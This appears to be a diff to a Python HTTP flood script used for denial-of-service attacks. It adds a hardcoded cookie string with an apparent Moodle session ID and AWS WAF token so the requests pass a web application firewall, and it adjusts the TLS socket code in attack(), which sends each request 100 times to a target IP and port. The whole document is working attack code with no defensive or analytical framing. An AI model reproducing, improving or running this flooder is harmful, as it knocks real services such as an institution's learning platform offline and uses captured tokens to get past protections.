@@ -70,6 +70,8 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 
+cookie_list = "_ga=GA1.2.101739958.1651700637; _gid=GA1.2.943656058.1651700637; MoodleSession=20p6m55i0v8r3do9r74m9sjuak; aws-waf-token=22301767-3df8-4c94-a6fe-4821d7288e8c:BgoAcBOYzwQAAAAA:XnICKdYmA+LqIFA+wfB6GLqXjb08belSHKVfDi10/Ad8csB5mhERKKTUBNCNI3MDO7zSm1NrQp1W88GxRLOHa5wLRP31LsFSYK+5KtGr96O5fSMTICGHT9rFY/Y1teA="
+
 def rqheader():
     connection = "Connection: Keep-Alive\r\n"
     accept = Choice(acceptall)
@@ -77,7 +79,8 @@ def rqheader():
     useragent = "User-Agent: " + Choice(useragents) + "\r\n"
     content = "Content-Type: application/x-www-form-urlencoded\r\n"
     length = "Content-Length: 0 \r\n"
-    header =  referer + useragent + accept + content + length + connection + "\r\n"
+    cookies = "Cookie:" + cookie_list + "\r\n"
+    header =  referer + useragent + accept + cookies + content + length + connection + "\r\n"
     return header
 
 def attack():
@@ -89,9 +92,9 @@ def attack():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
         if port == 443:
+            ctx = ssl.SSLContext()
+            x = ctx.wrap_socket(s,server_hostname=ip)
             try:
-                ctx = ssl.SSLContext()
-                x = ctx.wrap_socket(s,server_hostname=ip)
                 for i in range (100):
                     x.send(str.encode(request))
             except:
